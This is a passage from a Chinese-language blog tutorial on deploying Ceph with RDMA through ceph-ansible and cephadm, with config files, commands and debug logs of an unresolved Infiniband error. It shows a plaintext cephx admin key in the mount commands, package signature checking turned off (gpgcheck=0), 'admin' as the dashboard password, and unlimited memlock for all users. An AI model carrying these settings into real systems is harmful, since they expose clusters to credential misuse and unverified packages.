版本进行测试。</p><p><strong>在执行实际的部署安装前，我们可以使用下面的命令来查看对应的 ceph 软件包是否支持 rdma 。</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 验证 ceph bin 是否链接了 rdma 动态库</span><br>ldd /bin/ceph-osd | egrep <span class="hljs-string">&quot;rdma|verbs&quot;</span><br>ldd /bin/ceph-mon | egrep <span class="hljs-string">&quot;rdma|verbs&quot;</span><br>ldd /bin/ceph-mgr | egrep <span class="hljs-string">&quot;rdma|verbs&quot;</span><br>ldd /bin/ceph-mds | egrep <span class="hljs-string">&quot;rdma|verbs&quot;</span><br><br><span class="hljs-comment"># 验证 ceph bin 是否包含 rdma 的符号</span><br>strings /bin/ceph-osd | grep -i rdma<br>strings /bin/ceph-mon | grep -i rdma<br>strings /bin/ceph-mgr | grep -i rdma<br>strings /bin/ceph-mds | grep -i rdma<br></code></pre></td></tr></table></figure><h2 id="2-1、配置初始化"><a href="#2-1、配置初始化" class="headerlink" title="2.1、配置初始化"></a>2.1、配置初始化</h2><h3 id="2-1-1、部署配置初始化"><a href="#2-1-1、部署配置初始化" class="headerlink" title="2.1.1、部署配置初始化"></a>2.1.1、部署配置初始化</h3><blockquote><p><strong>注意:</strong> 我们在部署 <a href="https://github.com/ceph/ceph/tree/v16.2.15">Ceph v16.2.15</a> 版本的时候，将 <code>ms_public_type</code> 设置为 <code>async+posix</code> ，但是发现 <code>ceph-mgr</code> 在这种配置下会频繁报错: <code>Infiniband to_dead failed to send a beacon: (115) Operation now in progress</code> 。修改配置 <code>debug ms = 20/20</code> 分析发现 <code>Infiniband recv_cm_meta got bad length (26)</code> 相关报错信息。该错误后续有详细日志介绍，本文仍未解决该问题。</p></blockquote><p><strong>修改 ceph-ansible 中的 .&#x2F;group_vars&#x2F;all.yml 文件:</strong></p><figure class="highlight yml"><table><tr><td class="code"><pre><code class="hljs yml"><span class="hljs-comment"># ceph repo</span><br><span class="hljs-attr">ceph_origin:</span> <span class="hljs-string">repository</span><br><span class="hljs-attr">ceph_repository:</span> <span class="hljs-string">custom</span><br><span class="hljs-attr">ceph_custom_repo:</span> <span class="hljs-string">http://xxxxxxxxxxx/ceph-v16.2.15.repo</span><br><br><span class="hljs-comment"># conf</span><br><span class="hljs-attr">ceph_conf_overrides:</span><br>  <span class="hljs-attr">global:</span><br>    <span class="hljs-attr">ms_type:</span> <span class="hljs-string">async+rdma</span><br>    <span class="hljs-attr">ms_cluster_type:</span> <span class="hljs-string">async+rdma</span><br>    <span class="hljs-attr">ms_public_type:</span> <span class="hljs-string">async+posix</span><br>    <span class="hljs-attr">ms_async_rdma_cm:</span> <span class="hljs-literal">false</span><br>    <span class="hljs-attr">ms_bind_ipv4:</span> <span class="hljs-literal">true</span><br>    <span class="hljs-attr">ms_bind_ipv6:</span> <span class="hljs-literal">false</span><br>    <span class="hljs-attr">ms_async_rdma_type:</span> <span class="hljs-string">ib</span><br>    <span class="hljs-attr">ms_async_rdma_device_name:</span> <span class="hljs-string">mlx5_bond_0</span><br>    <span class="hljs-attr">ms_async_rdma_port_num:</span> <span class="hljs-number">1</span><br>    <span class="hljs-attr">ms_async_rdma_gid_idx:</span> <span class="hljs-number">3</span><br></code></pre></td></tr></table></figure><p><strong>使用 aliyun ceph 源的配置文件 ceph-v16.2.15.repo :</strong> (需要将该文件上传到一个 http 服务中供 ceph-ansible 下载)</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs conf">[ceph]<br>name=ceph<br>baseurl=https://mirrors.aliyun.com/ceph/rpm-16.2.15/el8/x86_64<br>enabled=1<br>gpgcheck=0<br><br>[ceph-noarch]<br>name=ceph noarch<br>baseurl=https://mirrors.aliyun.com/ceph/rpm-16.2.15/el8/noarch<br>enabled=1<br>gpgcheck=0<br><br>[ceph-source]<br>name=ceph source<br>baseurl=https://mirrors.aliyun.com/ceph/rpm-16.2.15/el8/SRPMS<br>enabled=1<br>gpgcheck=0<br></code></pre></td></tr></table></figure><blockquote><p>注意: 本次是采用非容器化的部署方式。安装 ceph 软件后，对应的 systemd 的配置文件位于 <code>/usr/lib/systemd/system/</code> 目录中。如果我们在部署时配置了 <code>ceph_&lt;service_name&gt;_systemd_overrides</code> 参数，那么 ceph-ansible 在部署集群时会在部署节点的 <code>/etc/systemd/system/</code> 目录中创建对应服务的配置目录（<code>/etc/systemd/system/ceph-&lt;service_name&gt;@.service.d/</code>）及对应的配置文件（<code>ceph-&lt;service_name&gt;-systemd-overrides.conf</code>），用来覆盖一些特定的参数。</p></blockquote><p><strong>修改 ceph-ansible 中各 ceph 服务的配置:</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 修改 mon systemd 配置文件模板</span><br>vi ./group_vars/mons.yml<br>ceph_mon_systemd_overrides:<br>  Service:<br>    LimitMEMLOCK: infinity<br>    PrivateDevices: no<br><br><span class="hljs-comment"># 修改 mgr systemd 配置文件模板</span><br>vi ./group_vars/mgrs.yml<br>ceph_mgr_systemd_overrides:<br>  Service:<br>    LimitMEMLOCK: infinity<br>    PrivateDevices: no<br><br><span class="hljs-comment"># 修改 osd systemd 配置文件模板</span><br>vi ./group_vars/osds.yml<br>ceph_osd_systemd_overrides:<br>  Service:<br>    LimitMEMLOCK: infinity<br>    PrivateDevices: no<br><br><span class="hljs-comment"># 修改 mds systemd 配置文件模板</span><br>vi ./group_vars/mdss.yml<br>ceph_mds_systemd_overrides:<br>  Service:<br>    LimitMEMLOCK: infinity<br>    PrivateDevices: no<br></code></pre></td></tr></table></figure><h3 id="2-1-2、配置部署节点环境"><a href="#2-1-2、配置部署节点环境" class="headerlink" title="2.1.2、配置部署节点环境"></a>2.1.2、配置部署节点环境</h3><p>由于 RDMA 通信要求固定计算机的物理内存（也就是说，当整个计算机在可用内存上启动不足时，内核不允许将该内存交换到分页文件）。固定内存通常是非常特权的操作。为了允许 root 之外的用户运行大型 RDMA 应用程序，可能需要增加非 root 用户在系统中被允许的内存量。这可以通过在 <code>/etc/security/limits.d/</code> 目录中添加一个自定义配置文件来实现。参考配置文件内容: <a href="https://enterprise-support.nvidia.com/s/article/bring-up-ceph-rdma---developer-s-guide">Bring Up Ceph RDMA - Developer’s Guide</a></p><p><strong>修改 Ceph 部署机器上的 &#x2F;etc&#x2F;security&#x2F;limits.d&#x2F;rdma.conf 配置:</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> /etc/security/limits.d/rdma.conf<br><span class="hljs-comment"># configuration for rdma tuning</span><br>*       soft    memlock         unlimited<br>*       hard    memlock         unlimited<br><span class="hljs-comment"># rdma tuning end</span><br></code></pre></td></tr></table></figure><h2 id="2-2、部署集群"><a href="#2-2、部署集群" class="headerlink" title="2.2、部署集群"></a>2.2、部署集群</h2><p><strong>相关命令:</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 探测节点</span><br>ansible -i hosts.ini -m ping all<br><br><span class="hljs-comment"># 部署集群</span><br>ansible-playbook -vvvv -i hosts.ini site.yml<br><br><span class="hljs-comment"># 销毁集群</span><br>ansible-playbook -vvvv -i hosts.ini infrastructure-playbooks/purge-cluster.yml<br><br><span class="hljs-comment"># 查看进程</span><br>watch -n 1 <span class="hljs-string">&quot;ps xau | grep ceph; podman ps&quot;</span><br><br><span class="hljs-comment"># 查看进程和 ceph 状态</span><br>watch -n 1 <span class="hljs-string">&quot;ps xau | grep ceph; podman ps; ceph -s&quot;</span><br></code></pre></td></tr></table></figure><h2 id="2-3、客户端挂载使用"><a href="#2-3、客户端挂载使用" class="headerlink" title="2.3、客户端挂载使用"></a>2.3、客户端挂载使用</h2><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 挂载 cephfs</span><br><span class="hljs-built_in">mkdir</span> -p /mnt/cephfs<br>mount -t ceph 10.10.10.1:6789,10.10.10.1:6789,10.10.10.1:6789:/ /mnt/cephfs -o name=admin,secret=AQANl5VobL1iKxAAF49gUb79LeHCnsftT2rV+g==<br><span class="hljs-built_in">ls</span> -al /mnt/cephfs/<br><br><span class="hljs-comment"># 读写测试</span><br><span class="hljs-built_in">dd</span> <span class="hljs-keyword">if</span>=/dev/zero bs=1M count=1000 | pv -L 3M | <span class="hljs-built_in">dd</span> of=/mnt/cephfs/testfile oflag=direct status=progress<br><span class="hljs-built_in">dd</span> <span class="hljs-keyword">if</span>=/mnt/cephfs/testfile bs=1M count=1000 iflag=direct | pv -L 1M | <span class="hljs-built_in">dd</span> of=/dev/null status=progress<br></code></pre></td></tr></table></figure><h1 id="三、使用-cephadm-部署"><a href="#三、使用-cephadm-部署" class="headerlink" title="三、使用 cephadm 部署"></a>三、使用 cephadm 部署</h1><blockquote><p><strong>注意:</strong> 由于 CentOS 8 已经没有 v19.x.x 版本的 cephadm 软件包供使用。但是我们通过在 CentOS 9 Stream 上编译打包 RPM 后提供 CentoS 8 使用。之后 cephadm 部署集群的时候使用官方最新的 Ceph 容器镜像，这里使用的是 Ceph v19.2.3 的容器镜像。</p></blockquote><p>本次测试环境的机器系统为 CentOS 8.5.2111 ，使用 Ceph <a href="https://github.com/ceph/ceph/tree/v19.2.3">v19.2.3</a> 版本进行测试。</p><h2 id="3-1、环境配置"><a href="#3-1、环境配置" class="headerlink" title="3.1、环境配置"></a>3.1、环境配置</h2><h3 id="3-1-1、配置-cephadm"><a href="#3-1-1、配置-cephadm" class="headerlink" title="3.1.1、配置 cephadm"></a>3.1.1、配置 cephadm</h3><p>在部署集群之前，我们需要指定一些集群配置以启用 RDMA 特性。这里仅介绍和 RDMA 有关的一些配置，其他的部署集群所需要的配置这里并没有介绍，仍需要你在部署集群前配置 ok 。</p><p><strong>&#x2F;root&#x2F;ceph.conf 配置文件内容如下:</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs conf">[global]<br>ms_type = async+rdma<br>ms_cluster_type = async+rdma<br>ms_public_type = async+posix<br>ms_async_rdma_cm = false<br>ms_bind_ipv4 = true<br>ms_bind_ipv6 = false<br>ms_async_rdma_type = ib<br>ms_async_rdma_device_name = mlx5_bond_0<br>ms_async_rdma_port_num = 1<br>ms_async_rdma_gid_idx = 3<br></code></pre></td></tr></table></figure><p><strong>配置解析:</strong></p><ul><li><code>ms_type</code> : 消息传输类型，支持 async+posix , async+dpdk 和 async+rdma 三种类型，其中 async+posix 为默认的传输类型，其他两种是实验性的并且支持可能受限。</li><li><code>ms_cluster_type</code> : 集群内部消息传输类型，如果未指定默认为 <code>ms_type</code> 。</li><li><code>ms_public_type</code> : 集群内部消息传输类型，如果未指定默认为 <code>ms_type</code> 。</li><li><code>ms_async_rdma_cm</code> : 是否启用 RDMA CM 方式管理 RDMA 连接，默认为 false ，如果未启用则使用 Verbs 方式管理 RDMA 连接。<ul><li>该参数需要和 ms_async_rdma_type 配合使用，如果该参数为 true ，则 ms_async_rdma_type 需要要设置为 iwarp ，否则会出错。</li></ul></li><li><code>ms_async_rdma_type</code> : RDMA 实现协议类型，可选值为 iwarp 或 ib ，默认为 ib 。</li><li><code>ms_async_rdma_device_name</code> : RDMA 设备名称。</li><li><code>ms_async_rdma_port_num</code> :  RDMA 设备上的端口号。一块网络卡可能有多个端口，每个端口都能独立地进行网络通信。port_num 参数用于选择具体哪个端口用于 RDMA 通讯。</li><li><code>ms_async_rdma_gid_idx</code> : RDMA 设备全局标识符。用于在 InfiniBand 网络中唯一标识设备。gid_idx 是 GID 表中的索引，用于选择特定的 GID。这在配置 RoCE（RDMA over Converged Ethernet）连接时尤其重要，可以根据需求选择使用 RoCE v1 或 v2。</li></ul><h3 id="3-1-2、配置部署节点环境"><a href="#3-1-2、配置部署节点环境" class="headerlink" title="3.1.2、配置部署节点环境"></a>3.1.2、配置部署节点环境</h3><p>由于 RDMA 通信要求固定计算机的物理内存（也就是说，当整个计算机在可用内存上启动不足时，内核不允许将该内存交换到分页文件）。固定内存通常是非常特权的操作。为了允许 root 之外的用户运行大型 RDMA 应用程序，可能需要增加非 root 用户在系统中被允许的内存量。这可以通过在 <code>/etc/security/limits.d/</code> 目录中添加一个自定义配置文件来实现。参考配置文件内容: <a href="https://enterprise-support.nvidia.com/s/article/bring-up-ceph-rdma---developer-s-guide">Bring Up Ceph RDMA - Developer’s Guide</a></p><p><strong>修改 Ceph 部署机器上的 &#x2F;etc&#x2F;security&#x2F;limits.d&#x2F;rdma.conf 配置:</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> /etc/security/limits.d/rdma.conf<br><span class="hljs-comment"># configuration for rdma tuning</span><br>*       soft    memlock         unlimited<br>*       hard    memlock         unlimited<br><span class="hljs-comment"># rdma tuning end</span><br></code></pre></td></tr></table></figure><h2 id="3-2、部署集群"><a href="#3-2、部署集群" class="headerlink" title="3.2、部署集群"></a>3.2、部署集群</h2><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 部署测试</span><br>cephadm bootstrap --config /root/ceph.conf --mon-ip 10.10.10.1 --initial-dashboard-password admin --allow-fqdn-hostname --no-minimize-config<br><br><span class="hljs-comment"># 启用文件日志（可选）</span><br>ceph config <span class="hljs-built_in">set</span> global log_to_file <span class="hljs-literal">true</span><br>ceph config <span class="hljs-built_in">set</span> global mon_cluster_log_to_file <span class="hljs-literal">true</span><br>ceph config <span class="hljs-built_in">set</span> global log_to_stderr <span class="hljs-literal">false</span><br>ceph config <span class="hljs-built_in">set</span> global mon_cluster_log_to_stderr <span class="hljs-literal">false</span><br>ceph config <span class="hljs-built_in">set</span> global log_to_journald <span class="hljs-literal">false</span><br>ceph config <span class="hljs-built_in">set</span> global mon_cluster_log_to_journald <span class="hljs-literal">false</span><br><br><span class="hljs-comment"># 初始化环境配置：新主机安装集群 SSH 公钥</span><br>ssh-copy-id -f -i /etc/ceph/ceph.pub root@host02<br>ssh-copy-id -f -i /etc/ceph/ceph.pub root@host03<br><br><span class="hljs-comment"># 添加主机到集群</span><br>ceph orch host add host02 10.10.10.2<br>ceph orch host add host02 10.10.10.3<br><br><span class="hljs-comment"># 添加 OSD 存储</span><br><span class="hljs-comment"># 注意: 由于我们配置调整 /etc/systemd/system/ceph-&lt;cluster_id&gt;@.service 配置文件，这会导致 osd 启动失败，</span><br><span class="hljs-comment">#       不过没有关系，我们会在下面统一调整该配置文件，之后在重启 osd 组件即可。</span><br>ceph orch device <span class="hljs-built_in">ls</span><br>ceph orch daemon add osd host01:/dev/nvme0n1,/dev/nvme1n1,/dev/nvme2n1<br>ceph orch daemon add osd host02:/dev/nvme0n1,/dev/nvme1n1,/dev/nvme2n1<br>ceph orch daemon add osd host03:/dev/nvme0n1,/dev/nvme1n1,/dev/nvme2n1<br><br><span class="hljs-comment"># 传输 ceph 集群和密钥配置文件（可选）</span><br>scp /etc/ceph/ceph.conf host02:/etc/ceph/<br>scp /etc/ceph/ceph.conf host02:/etc/ceph/<br>scp /etc/ceph/ceph.client.admin.keyring host02:/etc/ceph/<br>scp /etc/ceph/ceph.client.admin.keyring host03:/etc/ceph/<br><br><span class="hljs-comment"># 创建文件系统</span><br>ceph fs volume create cephfs<br><br><span class="hljs-comment"># 调整文件系统数据池副本为 2 （可选）</span><br>ceph osd pool <span class="hljs-built_in">ls</span> detail<br>ceph osd pool <span class="hljs-built_in">set</span> cephfs.cephfs.meta min_size 1<br>ceph osd pool <span class="hljs-built_in">set</span> cephfs.cephfs.meta size 2 --yes-i-really-mean-it<br>ceph osd pool <span class="hljs-built_in">set</span> cephfs.cephfs.data min_size 1<br>ceph osd pool <span class="hljs-built_in">set</span> cephfs.cephfs.data size 2 --yes-i-really-mean-it<br><br><span class="hljs-comment"># 查看集群配置</span><br>ceph tell osd.* config get ms_type<br>ceph tell osd.* config get ms_cluster_type<br>ceph tell osd.* config get ms_public_type<br>ceph tell osd.* config get ms_async_rdma_cm<br><br><span class="hljs-comment"># 销毁集群</span><br>cephadm rm-cluster --force --zap-osds --fsid b07cea80-741f-11f0-a76e-946dae8f5dda<br></code></pre></td></tr></table></figure><h2 id="3-3、集群配置调整"><a href="#3-3、集群配置调整" class="headerlink" title="3.3、集群配置调整"></a>3.3、集群配置调整</h2><blockquote><p><strong>注意:</strong> 当每次执行 <code>ceph orch daemon add *</code> 操作的时候，都会重新更新对应机器上的 <code>/etc/systemd/system/ceph-&lt;cluster_id&gt;@.service</code> 配置文件，我们可以从 <a href="https://github.com/ceph/ceph/blob/v19.2.3/src/cephadm/cephadmlib/systemd_unit.py#L137">src&#x2F;cephadm&#x2F;cephadmlib&#x2F;systemd_unit.py</a> 和 <a href="https://github.com/ceph/ceph/blob/v19.2.3/src/cephadm/cephadmlib/templating.py">src&#x2F;cephadm&#x2F;cephadmlib&#x2F;templating.py</a> 中找到相关的实现。由于这些模板会被打包成一个 zipapp 文件（即 cephadm 可执行文件），因此我们无法在执行 cephadm 的时候修改本地的一些文件来尝试在远程机器的 <code>/etc/systemd/system/ceph-&lt;cluster_id&gt;@.service</code> 文件中应用新的配置。</p></blockquote><p><strong>修改 &#x2F;etc&#x2F;systemd&#x2F;system&#x2F;ceph-<cluster_id>@.service 配置文件中的内容:</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">[Service]<br>LimitMEMLOCK=infinity<br>PrivateDevices=no<br></code></pre></td></tr></table></figure><p><strong>相关命令:</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 查询所有 ceph 相关的 systemd 文件的位置</span><br>systemctl show -p FragmentPath ceph-*<br><br><span class="hljs-comment"># 重新加载 systemd 的服务配置文件</span><br>systemctl daemon-reload<br><br><span class="hljs-comment"># 获取集群id</span><br>fsid=$(cephadm shell -- ceph fsid)<br><br><span class="hljs-comment"># 重启 osd 服务</span><br><span class="hljs-comment"># 需要在每个部署 osd 的节点上执行</span><br><span class="hljs-built_in">ls</span> /var/lib/ceph/<span class="hljs-variable">$fsid</span>/ | grep osd | <span class="hljs-keyword">while</span> <span class="hljs-built_in">read</span> <span class="hljs-built_in">dir</span>; <span class="hljs-keyword">do</span> systemctl restart ceph-<span class="hljs-variable">$fsid</span>@<span class="hljs-variable">$dir</span>.service; <span class="hljs-keyword">done</span><br><br><br><span class="hljs-comment"># 检查 cephadm 部分内容</span><br>[root@host01 data]# unzip -l /usr/sbin/cephadm | grep templates<br>warning [/usr/sbin/cephadm]:  2 extra bytes at beginning or within zipfile<br>  (attempting to process anyway)<br>        0  02-01-2024 07:14   cephadmlib/templates/<br>     1488  02-01-2024 07:14   cephadmlib/templates/init_containers.run.j2<br>      205  02-01-2024 07:14   cephadmlib/templates/dropin.service.j2<br>     1264  02-01-2024 07:14   cephadmlib/templates/init_ctr.service.j2<br>      133  02-01-2024 07:14   cephadmlib/templates/cephadm.logrotate.config.j2<br>      508  02-01-2024 07:14   cephadmlib/templates/sidecar.run.j2<br>     1031  02-01-2024 07:14   cephadmlib/templates/sidecar.service.j2<br>     1198  02-01-2024 07:14   cephadmlib/templates/ceph.service.j2<br>      307  02-01-2024 07:14   cephadmlib/templates/agent.service.j2<br>      280  02-01-2024 07:14   cephadmlib/templates/cluster.logrotate.config.j2<br><br><span class="hljs-comment"># 查看 cephadm 部分内容</span><br><span class="hljs-built_in">mkdir</span> ./cephadm_templates<br>unzip /usr/sbin/cephadm <span class="hljs-string">&#x27;cephadmlib/templates/*&#x27;</span> -d ./cephadm_templates<br><span class="hljs-built_in">cat</span> ./cephadm_templates/cephadmlib/templates/ceph.service.j2<br></code></pre></td></tr></table></figure><h2 id="3-4、客户端挂载使用"><a href="#3-4、客户端挂载使用" class="headerlink" title="3.4、客户端挂载使用"></a>3.4、客户端挂载使用</h2><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 挂载 cephfs</span><br><span class="hljs-built_in">mkdir</span> -p /mnt/cephfs<br>mount -t ceph 10.10.10.1:6789,10.10.10.1:6789,10.10.10.1:6789:/ /mnt/cephfs -o name=admin,secret=AQANl5VobL1iKxAAF49gUb79LeHCnsftT2rV+g==<br><span class="hljs-built_in">ls</span> -al /mnt/cephfs/<br><br><span class="hljs-comment"># 读写测试</span><br><span class="hljs-built_in">dd</span> <span class="hljs-keyword">if</span>=/dev/zero bs=1M count=1000 | pv -L 3M | <span class="hljs-built_in">dd</span> of=/mnt/cephfs/testfile oflag=direct status=progress<br><span class="hljs-built_in">dd</span> <span class="hljs-keyword">if</span>=/mnt/cephfs/testfile bs=1M count=1000 iflag=direct | pv -L 1M | <span class="hljs-built_in">dd</span> of=/dev/null status=progress<br></code></pre></td></tr></table></figure><h1 id="四、相关问题"><a href="#四、相关问题" class="headerlink" title="四、相关问题"></a>四、相关问题</h1><h2 id="4-1、Infiniband-to-dead-failed-to-send-a-beacon-错误"><a href="#4-1、Infiniband-to-dead-failed-to-send-a-beacon-错误" class="headerlink" title="4.1、Infiniband to_dead failed to send a beacon 错误"></a>4.1、Infiniband to_dead failed to send a beacon 错误</h2><p><strong>问题记录:</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">2024-08-09T13:34:49.108+0800 7fcdd4ea8700 -1 Infiniband to_dead failed to send a beacon: (115) Operation now <span class="hljs-keyword">in</span> progress<br>2024-08-09T13:34:50.702+0800 7fcdd56a9700 -1 Infiniband to_dead failed to send a beacon: (115) Operation now <span class="hljs-keyword">in</span> progress<br>2024-08-09T13:34:50.703+0800 7fcdd5eaa700 -1 Infiniband to_dead failed to send a beacon: (115) Operation now <span class="hljs-keyword">in</span> progress<br>2024-08-09T13:34:50.703+0800 7fcdd4ea8700 -1 Infiniband to_dead failed to send a beacon: (115) Operation now <span class="hljs-keyword">in</span> progress<br>2024-08-09T13:34:50.905+0800 7fcdd5eaa700 -1 Infiniband to_dead failed to send a beacon: (115) Operation now <span class="hljs-keyword">in</span> progress<br><br><br>2024-08-09T14:06:56.631+0800 7fbe29599700 20 EpollDriver.del_event del event fd=41 cur_mask=3 delmask=3 to 27<br>2024-08-09T14:06:56.631+0800 7fbe29599700 10 Infiniband send_cm_meta sending: 0, 13049, 2116118, 0, 00000000000000000000ffff0a5a1833<br>2024-08-09T14:06:56.631+0800 7fbe29d9a700 20  RDMAConnectedSocketImpl try_connect tcp_fd: 43<br>2024-08-09T14:06:56.631+0800 7fbe29d9a700 20 Event(0x55df39caa300 nevent=5000 time_id=2).create_file_event create event started fd=43 mask=3 original mask is 0<br>2024-08-09T14:06:56.631+0800 7fbe29d9a700 20 EpollDriver.add_event add event fd=43 cur_mask=0 add_mask=3 to 24<br>2024-08-09T14:06:56.631+0800 7fbe29d9a700 20 Event(0x55df39caa300 nevent=5000 time_id=2).create_file_event create event end fd=43 mask=3 current mask is 3<br>2024-08-09T14:06:56.631+0800 7fbe29d9a700 20 Event(0x55df39caa300 nevent=5000 time_id=2).create_file_event create event started fd=39 mask=1 original mask is 0<br>2024-08-09T14:06:56.631+0800 7fbe29d9a700 20 EpollDriver.add_event add event fd=39 cur_mask=0 add_mask=1 to 24<br>2024-08-09T14:06:56.631+0800 7fbe29d9a700 20 Event(0x55df39caa300 nevent=5000 time_id=2).create_file_event create event end fd=39 mask=1 current mask is 1<br>2024-08-09T14:06:56.631+0800 7fbe29599700 20 Event(0x55df39caa800 nevent=5000 time_id=2).create_file_event create event started fd=41 mask=1 original mask is 0<br>2024-08-09T14:06:56.631+0800 7fbe29599700 20 EpollDriver.add_event add event fd=41 cur_mask=0 add_mask=1 to 27<br>2024-08-09T14:06:56.631+0800 7fbe29599700 20 Event(0x55df39caa800 nevent=5000 time_id=2).create_file_event create event end fd=41 mask=1 current mask is 1<br>2024-08-09T14:06:56.631+0800 7fbe29599700 20  RDMAConnectedSocketImpl handle_connection_established finish<br>2024-08-09T14:06:56.631+0800 7fbe29d9a700 10 --  &gt;&gt; [v2:10.10.10.1:3300/0,v1:10.10.10.1:6789/0] conn(0x55df3909ac00 msgr2=0x55df39009e00 unknown :-1 s=STATE_CONNECTING_RE l=0).process nonblock connect inprogress<br>2024-08-09T14:06:56.631+0800 7fbe2a59b700 20  RDMAConnectedSocketImpl handle_connection_established start<br>2024-08-09T14:06:56.631+0800 7fbe2a59b700 20 EpollDriver.del_event del event fd=42 cur_mask=3 delmask=3 to 21<br>2024-08-09T14:06:56.631+0800 7fbe2a59b700 10 Infiniband send_cm_meta sending: 0, 13050, 5515815, 0, 00000000000000000000ffff0a5a1833<br>2024-08-09T14:06:56.631+0800 7fbe29d9a700 20  RDMAConnectedSocketImpl handle_connection_established start<br>2024-08-09T14:06:56.631+0800 7fbe29d9a700 20 EpollDriver.del_event del event fd=43 cur_mask=3 delmask=3 to 24<br>2024-08-09T14:06:56.631+0800 7fbe29d9a700 10 Infiniband send_cm_meta sending: 0, 13048, 0, 0, 00000000000000000000ffff0a5a1833<br>2024-08-09T14:06:56.631+0800 7fbe2a59b700 20 Event(0x55df39caa080 nevent=5000 time_id=2).create_file_event create event started fd=42 mask=1 original mask is 0<br>2024-08-09T14:06:56.631+0800 7fbe2a59b700 20 EpollDriver.add_event add event fd=42 cur_mask=0 add_mask=1 to 21<br>2024-08-09T14:06:56.631+0800 7fbe2a59b700 20 Event(0x55df39caa080 nevent=5000 time_id=2).create_file_event create event end fd=42 mask=1 current mask is 1<br>2024-08-09T14:06:56.631+0800 7fbe29599700 20  RDMAConnectedSocketImpl handle_connection QP: 13049 tcp_fd: 41 notify_fd: 38<br>2024-08-09T14:06:56.631+0800 7fbe2a59b700 20  RDMAConnectedSocketImpl handle_connection_established finish<br>2024-08-09T14:06:56.631+0800 7fbe29599700  1 Infiniband recv_cm_meta got bad length (26)<br>2024-08-09T14:06:56.631+0800 7fbe29599700  1  RDMAConnectedSocketImpl handle_connection recv handshake msg failed.<br>2024-08-09T14:06:56.631+0800 7fbe29599700  1  RDMAConnectedSocketImpl fault tcp fd 41<br>2024-08-09T14:06:56.631+0800 7fbe29d9a700 20 Event(0x55df39caa300 nevent=5000 time_id=2).create_file_event create event started fd=43 mask=1 original mask is 0<br>2024-08-09T14:06:56.631+0800 7fbe29d9a700 20 EpollDriver.add_event add event fd=43 cur_mask=0 add_mask=1 to 24<br>2024-08-09T14:06:56.631+0800 7fbe29d9a700 20 Event(0x55df39caa300 nevent=5000 time_id=2).create_file_event create event end fd=43 mask=1 current mask is 1<br>2024-08-09T14:06:56.631+0800 7fbe29d9a700 20  RDMAConnectedSocketImpl handle_connection_established finish<br>2024-08-09T14:06:56.631+0800 7fbe29599700 20 --  &gt;&gt; [v2:10.10.10.2:3300/0,v1:10.10.10.2:6789/0] conn(0x55df3909a800 msgr2=0x55df3900a300 unknown :-1 s=STATE_CONNECTING_RE l=0).process<br>2024-08-09T14:06:56.631+0800 7fbe29599700 20 EpollDriver.del_event del event fd=38 cur_mask=1 delmask=2 to 27<br>2024-08-09T14:06:56.631+0800 7fbe29599700 10 --  &gt;&gt; [v2:10.10.10.2:3300/0,v1:10.10.10.2:6789/0] conn(0x55df3909a800 msgr2=0x55df3900a300 unknown :-1 s=STATE_CONNECTING_RE l=0).process connect successfully, ready to send banner<br>2024-08-09T14:06:56.631+0800 7fbe29599700 20 --2-  &gt;&gt; [v2:10.10.10.2:3300/0,v1:10.10.10.2:6789/0] conn(0x55df3909a800 0x55df3900a300 unknown :-1 s=START_CONNECT pgs=0 cs=0 l=0 rev1=0 rx=0 tx=0).read_event<br>2024-08-09T14:06:56.631+0800 7fbe29599700 20 --2-  &gt;&gt; [v2:10.10.10.2:3300/0,v1:10.10.10.2:6789/0] conn(0x55df3909a800 0x55df3900a300 unknown :-1 s=START_CONNECT pgs=0 cs=0 l=0 rev1=0 rx=0 tx=0).start_client_banner_exchange<br>2024-08-09T14:06:56.631+0800 7fbe29599700 20 --2-  &gt;&gt; [v2:10.10.10.2:3300/0,v1:10.10.10.2:6789/0] conn(0x55df3909a800 0x55df3900a300 unknown :-1 s=BANNER_CONNECTING pgs=0 cs=0 l=0 rev1=0 rx=0 tx=0)._banner_exchange<br>2024-08-09T14:06:56.631+0800 7fbe29599700  1 --  &gt;&gt; [v2:10.10.10.2:3300/0,v1:10.10.10.2:6789/0] conn(0x55df3909a800 msgr2=0x55df3900a300 unknown :-1 s=STATE_CONNECTION_ESTABLISHED l=0)._try_send send error: (32) Broken pipe<br>2024-08-09T14:06:56.631+0800 7fbe29599700  1 --2-  &gt;&gt; [v2:10.10.10.2:3300/0,v1:10.10.10.2:6789/0] conn(0x55df3909a800 0x55df3900a300 unknown :-1 s=BANNER_CONNECTING pgs=0 cs=0 l=0 rev1=0 rx=0 tx=0).write banner write failed r=-32 ((<span class="hljs-number">32</span>) Broken pipe)<br><span class="hljs-number">2024</span>-<span class="hljs-number">08</span>-<span class="hljs-number">09</span>T14:<span class="hljs-number">06</span>:<span class="hljs-number">56.631</span>+<span class="hljs-number">0800</span> <span class="hljs-number">7</span>fbe29599700 <span class="hljs-number">10</span> --<span class="hljs-number">2</span>-  &gt;&gt; [v2:<span class="hljs-number">10.10</span>.<span class="hljs-number">10.2</span>:<span class="hljs-number">3300</span>/<span class="hljs-number">0</span>,v1:<span class="hljs-number">10.10</span>.<span class="hljs-number">10.2</span>:<span class="hljs-number">6789</span>/<span class="hljs-number">0</span>] conn(<span class="hljs-number">0</span>x55df3909a800 <span class="hljs-number">0</span>x55df3900a300 unknown :-<span class="hljs-number">1</span> s=BANNER_CONNECTING pgs=<span class="hljs-number">0</span> cs=<span class="hljs-number">0</span> l=<span class="hljs-number">0</span> rev1=<span class="hljs-number">0</span> rx=<span class="hljs-number">0</span> tx=<span 